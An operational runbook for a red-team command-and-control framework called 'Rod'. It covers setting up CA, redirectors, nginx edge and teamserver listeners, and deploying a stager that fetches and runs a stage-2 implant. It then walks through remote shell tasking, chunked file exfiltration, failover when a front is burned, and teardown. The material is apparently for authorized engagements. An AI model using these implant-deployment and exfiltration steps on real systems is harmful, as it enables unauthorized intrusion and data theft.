# Rehearsal engagement -- the pre-deployment walk

Operational runbook for the rehearsal every deployment gets before it faces
a client network: one full engagement lifecycle on production-shaped
infrastructure -- an externally provisioned CA, Postgres persistence, a
redirector front with a repoint, a mid-engagement teamserver restart with
audit-chain recovery, and a teardown to report
([architecture.md](../architecture.md) Sec 8, Sec 9, Sec 12.1).

Two walks live here. The single-host walk (Sec 1-3) is the fast
pre-engagement baseline: it was executed end to end on one Linux host
(WSL), every command is real, and the acceptance evidence quoted is what
the run produced. The multi-host walk (Sec 4) composes the production
shape -- a TLS-terminating edge in front of the certificate-less ingress,
the redirector on its own host carrying the mTLS beacon across a network
hop, and a pipeline-built win-x64 implant checking in from a real Windows
machine -- and it was executed the same way. Scale the addresses to the
engagement's real infrastructure; the lifecycle steps do not change.

## 1. Provision the infrastructure

### The engagement CA (out of band)

The teamserver never generates the production CA
([architecture.md](../architecture.md) Sec 9); provision one with the
operator PKI tooling and hand the teamserver the PEM files:

```
openssl req -x509 -newkey rsa:3072 -nodes \
  -keyout ca.key -out ca.crt -days 3650 \
  -addext "basicConstraints=critical,CA:TRUE" \
  -addext "keyUsage=critical,keyCertSign,cRLSign" \
  -subj "/O=Rod Rehearsal/CN=Rod Rehearsal Engagement CA"
```

RSA is the only supported CA key type; keep the key off the teamserver
host if the signing posture demands it (only the signing path needs it --
rotation is file replacement plus restart).

### Postgres

Stand up a PostgreSQL instance and apply the schema once per deployment:

```
dotnet ef database update \
  -p src/teamserver/Rod.Persistence -s src/teamserver/Rod.TeamServer \
  --connection "Host=<host>;Port=<port>;Username=<user>;Password=<pass>;Database=rod"
```

### The redirectors

Build and deploy the reference L4 forwarder per
[redirectors.md](redirectors.md) -- one process per front. The rehearsal
topology uses two, primary and fallback:

```
rod-redirector -listen <front-a>:443 -upstream <teamserver-mtls>:9443
rod-redirector -listen <front-b>:443 -upstream <teamserver-mtls>:9443
```

## 2. Configure and start the teamserver

Three listeners make the production shape (bound per the
[teamserver.md](teamserver.md) reference, shown here as environment
variables; `appsettings` sections are equivalent):

| Listener | Transport | Purpose |
|----------|-----------|---------|
| `beacon` | `Mtls` | The implant check-in channel. Public endpoint is the primary redirector; implants present the CA-signed leaf here. |
| `enroll-http` | `Http` | The certificate-less ingress stage-1 rides: enroll and stage-2 fetch hold no leaf yet, so an mTLS listener cannot serve their TLS handshake. In a real deployment the operator's TLS-terminating edge fronts this shape ([architecture.md](../architecture.md) Sec 8); on the rehearsal host it is loopback plain HTTP standing in for that edge. |
| `operator-http` | `Http` | The operator API and UI. Keep it loopback or behind the crew's VPN/TLS edge -- credentials cross it in the clear otherwise. |

```
export Pki__CaCertificatePath=/path/ca.crt
export Pki__CaPrivateKeyPath=/path/ca.key
export ConnectionStrings__Postgres='Host=<host>;Port=<port>;Username=<user>;Password=<pass>;Database=rod'
export Audit__DataDirectory=/path/engagement-data
export Operators__Initial__Handle=lead Operators__Initial__Password=...
export Listeners__0__Name=beacon Listeners__0__Transport=Mtls \
       Listeners__0__BindAddress=0.0.0.0:9443 Listeners__0__PublicEndpoint=https://<front-a>:443
...
dotnet run --project src/teamserver/Rod.TeamServer
```

Startup fails loudly on a missing CA file, an unreachable database, or a
misconfigured listener -- that is the acceptance for step zero.

## 3. Walk the lifecycle

1. **Log in and open the engagement**: `POST /operators/login`, create the
   engagement, mint a stager token (`POST /engagements/{id}/stager-tokens`).
   The secret shows once.
2. **Build the stage-2** with the beacon profile baked: endpoint is the
   enroll ingress, `fallbackEndpoints` carries the fallback front, sleep
   and jitter to the engagement's cadence, kill date to its window.
3. **Build the stage-1 stager** naming the stage-2 (`class: stager`,
   `stage2PayloadId`), download both artifacts.
4. **Deploy**: run the stager where the engagement needs presence. With the
   split topology, name the beacon front and the CA pin:
   `./Rod.Stager -token <secret> -enroll-url https://<edge>/implants/enroll
   -payload <stage2-id> -beacon-url https://<front-a>:443 -ca-cert ca.crt`.
   The stager fetches the stage-2, verifies the baked fingerprint, runs it,
   and hands the credential over; the stage-2 enrols against the external
   CA and appears on the roster (`GET /engagements/{id}/presence`).
5. **Task and collect**: issue verbs over
   `POST /engagements/{id}/tasks`; results land on the task and in the
   audit trail. Bulk collection (`file.pull` of a multi-megabyte file)
   rides the chunked-exfil arm and lands as an engagement artifact.
6. **Crash and recover**: kill the teamserver mid-engagement (the fronts
   keep listening; the implant's beacon loop retries). Restart it. Accept:
   the implant returns to the roster on its own; the audit trail reloads
   with the pre-restart hash chain byte-identical; artifacts remain
   retrievable; operator cookies survive (the data-protection keys and the
   credential store are durable).
7. **Burn a front**: stop the primary redirector. The implant's check-ins
   fail and the baked egress walk advances to the fallback front -- it
   returns to the roster with no operator action. Then repoint the
   listener (`POST /listeners/{id}:repoint` with the fallback front) so
   the server-side record names the live front and the burned one is
   severed. No backend restart, no bind change.
8. **Tear down to report**: retire the implant
   (`POST /engagements/{id}/implants/{implantId}:retire`) -- its session
   closes and the next handshake is refused -- stop the fronts, export the
   report (`GET /engagements/{id}/report`, `?format=markdown`), and
   decommission the infrastructure. The data directory and the report are
   the evidence that outlives the teardown.

## Acceptance evidence from the single-host walk

- The lifecycle completed on the shape above: enroll through the split
  topology (stager fetch -> fingerprint check -> stage-2 enroll against
  the external CA), stream-mode beacon through the redirector front,
  `shell.exec` / `file.pull` / `recon.hostenum` round-trips, a 2 MiB
  chunked exfil landing byte-exact as an engagement artifact.
- A `kill -9` mid-engagement followed by a restart: the implant
  reconnected unattended; the 16 pre-crash audit events reloaded with an
  identical hash-chain digest (`md5` over the exported timeline hashes
  before and after matched); the exfil artifact returned its exact bytes;
  the operator session stayed valid across the restart.
- Burning the primary front moved the implant to the baked fallback with
  no operator action; the repoint swapped the listener's public endpoint
  at runtime (bind untouched, `repointedAt` stamped); tasking continued
  through the new front.
- Retire closed the live session and emptied the roster; the exported
  report carried the full arc (4 tasks, 1 artifact, 20 timeline events)
  with its content hash.

The walk also surfaced and fixed a deployment blocker no test had caught:
the shipped configuration's empty `Build:ImplantExtensionDirectory`
string aborted every implant-class payload build. That is the standing
argument for this rehearsal -- it exercises the composed system, not the
slices.

## 4. Walk the multi-host shape

The single-host walk above is the fast baseline. The multi-host walk
composes the stack the way a client network sees it
([architecture.md](../architecture.md) Sec 7, Sec 8): the enroll ingress
and the operator API terminate TLS at a real edge, the reference
redirector runs on its own host fronting the mTLS listener across a
network hop, and the implant is a win-x64 build from the pipeline running
on a real Windows machine. Walk this once before pointing Rod at a client
network; the smallest honest shape is two machines and it scales by
address substitution alone.

```
operator + target host (Windows, 10.3.16.23)      teamserver host (Linux, 172.17.67.116)
  rod-redirector -listen :443  (primary) --- L4 -->  beacon mTLS   0.0.0.0:9443
  rod-redirector -listen :8443 (fallback) -- L4 -->  beacon mTLS   0.0.0.0:9443
  Rod.Stager.exe / Rod.Implant.exe                   enroll        127.0.0.1:5080  <- edge :443
  operator (curl, browser) -- TLS --> edge :9000 -->  operator API  127.0.0.1:5081
                                                     Postgres      127.0.0.1:5432
```

(When the teamserver host is WSL, the Windows side mirrors its listening
ports onto localhost -- dial the edge and the fronts by address, never by
localhost, or the two paths cross.)

Two rules shape the edge ([redirectors.md](redirectors.md) Sec 7):

- The mTLS beacon path is never TLS-terminated: a terminating hop cannot
  re-present the implant's client certificate upstream, so the beacon
  rides the L4 redirectors and only the certificate-less paths terminate.
- The edge's certificate must chain to the engagement CA. The stager and
  the stage-2 pin the CA -- chain-to-pinned-CA, not a hostname match --
  so the edge validates exactly the way the teamserver itself would.

### The edge certificate

Same externally provisioned CA as Sec 1; the edge leaf is minted from it,
with the SAN entries naming how the edge is dialed (an IP entry when the
URL is an address):

```
openssl req -new -newkey rsa:3072 -nodes -keyout edge.key -out edge.csr   -subj "/O=Rod Rehearsal/CN=rod-edge"
openssl x509 -req -in edge.csr -CA ca.crt -CAkey ca.key -CAcreateserial   -out edge.crt -days 825 -sha256   -extfile <(printf "basicConstraints=critical,CA:FALSE\nkeyUsage=critical,digitalSignature,keyEncipherment\nextendedKeyUsage=serverAuth\nsubjectAltName=IP:172.17.67.116\n")
```

### The edge tier

One nginx, two TLS vhosts, both proxying to loopback-only Http listeners
on the teamserver: enroll on `:443` -> `127.0.0.1:5080`, the operator API
on `:9000` -> `127.0.0.1:5081`. The operator vhost needs `proxy_buffering
off` and a long read timeout -- the live channel is an hour-scale SSE
stream (the server already sends `X-Accel-Buffering: no`, so this is belt
and braces). On an SELinux host, proxying to loopback needs
`setsebool -P httpd_can_network_connect 1`, and the listen ports must be
in `http_port_t` (`semanage port -l | grep http_port_t` names them; when
443 is taken by the WSL mirror, 9000 is the next resident).

```nginx
server {
    listen 443 ssl;
    ssl_certificate     /etc/pki/rod/edge.crt;
    ssl_certificate_key /etc/pki/rod/edge.key;
    location / { proxy_pass http://127.0.0.1:5080; }
}
server {
    listen 9000 ssl;
    ssl_certificate     /etc/pki/rod/edge.crt;
    ssl_certificate_key /etc/pki/rod/edge.key;
    location / {
        proxy_pass http://127.0.0.1:5081;
        proxy_buffering off;
        proxy_read_timeout 3600s;
    }
}
```

### The teamserver

Three listeners; the two Http ones bind loopback only, so the edge is the
only way in. The beacon's public endpoint names the primary front, and
the fallback front is baked into the payload as a fallback endpoint:

```
export Listeners__0__Name=beacon Listeners__0__Transport=Mtls        Listeners__0__BindAddress=0.0.0.0:9443        Listeners__0__PublicEndpoint=https://<front-host>:443
export Listeners__1__Name=enroll-http Listeners__1__Transport=Http        Listeners__1__BindAddress=127.0.0.1:5080        Listeners__1__PublicEndpoint=https://<edge-host>
export Listeners__2__Name=operator-http Listeners__2__Transport=Http        Listeners__2__BindAddress=127.0.0.1:5081        Listeners__2__PublicEndpoint=https://<edge-host>:9000
```

### The fronts on their own host

Publish for the redirector host's RID. Native AOT cannot cross-compile
operating systems, so building a win-x64 front from a Linux host drops
the AOT pass for a self-contained single-file build (a production front
built on its own OS keeps the AOT binary):

```
dotnet publish src/redirector/dotnet/Rod.Redirector.csproj -r win-x64 -c Release   -p:PublishAot=false -p:PublishSingleFile=true --self-contained true
```

Two processes on the front host, both upstream at the beacon listener's
bind address:

```
rod-redirector.exe -listen 0.0.0.0:443  -upstream <teamserver-host>:9443   # primary
rod-redirector.exe -listen 0.0.0.0:8443 -upstream <teamserver-host>:9443   # fallback
```

### Walk the lifecycle

Every step of Sec 3 runs unchanged -- through the edge for login,
engagement, token mint, payload builds, and artifact downloads (a
Schannel-built curl cannot consume a pinned CA file; verify the edge
chain with `openssl s_client -connect <edge>:9000 -CAfile ca.crt` --
`Verify return code: 0` -- and drive the API over the so-verified TLS),
and through the fronts for the implant:

```
./Rod.Stager.exe -token <secret>   -enroll-url https://<edge-host>/implants/enroll   -payload <stage2-payload-id> -beacon-url https://<front-host>:443   -ca-cert ca.crt
```

The stage-2 build names the edge in `Endpoint` and the fallback front in
`FallbackEndpoints`; the stager names the primary front at run time.

## Acceptance evidence from the multi-host walk

- The stager fetched the stage-2 (38,097,067 bytes) through the nginx
  edge and verified the baked fingerprint; the stage-2 enrolled against
  the external CA through the same edge, and its beacon completed the
  mTLS handshake through the remote redirector from the real Windows
  machine (`handshake ok`, replay nonces on).
- `shell.exec` (`hostname && whoami` -> the machine's own name and user)
  and `recon.hostenum` round-tripped through the front; a `file.pull` of
  a 2 MiB file streamed as 4 chunks to the artifact store and the
  downloaded artifact's sha256 matched the source file exactly.
- Burning the primary front (process kill) moved the implant to the
  baked fallback with no operator action; the listener repointed at
  runtime (`repointedAt` stamped, bind untouched) and the next task
  round-tripped through the new front.
- Retire closed the session and emptied the roster; the exported report
  carries the arc -- 4 tasks, 1 artifact, the hash-chained timeline with
  its integrity digest.
- The walk surfaced a blocker no Linux-side run can catch: the Windows
  implant's beacon failed every mTLS handshake with SChannel's
  "credentials not recognized," because the enrolled leaf's in-memory
  key pairing is invisible to the Windows TLS stack. The fix -- a PFX
  round-trip when the leaf is paired at enroll -- rides in the commit
  that records this walk. That is the standing argument for walking the
  composed system on the real shape before it faces a client network.
